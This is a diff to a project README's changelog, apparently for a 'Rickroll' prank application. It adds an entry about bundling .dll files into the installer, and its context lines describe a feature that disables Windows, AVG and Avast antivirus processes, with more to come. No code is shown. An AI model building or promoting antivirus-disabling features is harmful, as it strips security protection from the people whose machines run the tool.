@@ -13,6 +13,10 @@ Note this application is a WIP so features may not work. You also need a host sy
 
 Changelog
 =========
+0.5.5
+Integrated Required .dll files into the installer. Copies of these files are inside the repos
+You can edit the startup file using the .sln file (Rickroll folder in repo)!
+
 0.5.4
 Disabled Windows Antivirus processes
 Also Disabled AVG & Avast processes. I will add the ability disable more antivirus solutions later.
